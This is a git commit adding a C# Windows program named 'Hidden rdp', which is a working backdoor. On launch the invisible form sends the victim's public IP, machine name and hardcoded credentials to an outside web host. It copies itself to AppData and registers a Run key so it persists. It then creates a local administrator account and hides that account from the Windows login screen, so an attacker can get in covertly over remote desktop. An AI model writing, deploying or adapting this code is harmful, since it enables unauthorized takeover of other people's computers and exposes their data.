ba4a328afa7f870ee1d93e73c7487d2b35337cf9
DeosDoes <deosdoes81@gmail.com>
2017-05-29 09:23:43 +0300

    Initial commit

---
+++ Hidden rdp/Hidden rdp/Form1.Designer.cs
@@ -0,0 +1,62 @@
+﻿namespace Hidden_rdp
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.iptimer = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // iptimer
+            // 
+            this.iptimer.Enabled = true;
+            this.iptimer.Interval = 3600000;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(148, 29);
+            this.ControlBox = false;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.Opacity = 0D;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Shown += new System.EventHandler(this.Form1_Shown);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer iptimer;
+    }
+}
+
---
+++ Hidden rdp/Hidden rdp/Form1.cs
@@ -0,0 +1,78 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Net;
+using System.IO;
+using Microsoft.Win32;
+using System.Management;
+using System.DirectoryServices;
+using System.DirectoryServices.AccountManagement;
+using System.Runtime.InteropServices;
+
+namespace Hidden_rdp
+{
+    public partial class Form1 : Form
+
+    {
+        //===========================================================================================================================================
+        //Send data on open
+        string targetUrl = "https://leakkings.000webhostapp.com/write.php?info=";
+        string userName = "hidden";
+        string pcName = Environment.MachineName.ToString();
+        string myIp = new WebClient().DownloadString(@"http://ipv4bot.whatismyipaddress.com/");
+        string password = "alimadore";
+
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Shown(object sender, EventArgs e)
+        {
+            string info = myIp + ";" + pcName + ";" + userName + ";" + password;
+            var fullurl = targetUrl + info;
+            var conent = new System.Net.WebClient().DownloadString(fullurl);
+
+            //===========================================================================================================================================
+            //Copy to AppData + Registry Startup (incase pc has dynamic ip,add datasender to startup to prevent losing the slave
+            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SenderData.exe"))
+            {
+                this.Hide();
+            }
+            else
+            {
+                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SenderData.exe");
+                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                reg.SetValue("Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SenderData.exe");
+            }
+            //===========================================================================================================================================
+            //Create new user and make it admin (x64 bit only,need to make an "if-else" to check if its 32 bit or 64bit
+
+            const string USER_NAME = "hidden";
+            char[] c_PWchars = { 'A', 'l', 'i', 'm', 'a', 'd', 'o', 'r', 'e' };
+            System.Security.SecureString oPW = new System.Security.SecureString();
+            foreach (char c_Chr in c_PWchars)
+            {
+                oPW.AppendChar(c_Chr);
+            }
+            DirectoryEntry oComputer = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
+            DirectoryEntry oNewUser = oComputer.Children.Add(USER_NAME, "user");
+            IntPtr pString = IntPtr.Zero;
+            pString = Marshal.SecureStringToGlobalAllocUnicode(oPW);
+            oNewUser.Invoke("SetPassword", new object[] { Marshal.PtrToStringUni(pString) });
+            oNewUser.Invoke("Put", new object[] { "Description", "New Administrator" });
+            oNewUser.CommitChanges();
+            Marshal.ZeroFreeGlobalAllocUnicode(pString);
+            DirectoryEntry oGroup = oComputer.Children.Find("Administrators", "group");
+            oGroup.Invoke("Add", new object[] { oNewUser.Path.ToString() });
+            Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList");
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
+            key.SetValue("UserNew", 0, RegistryValueKind.DWord);
+            key.Close();
+            this.Close();
+        }
+    }
+}
+
+
+
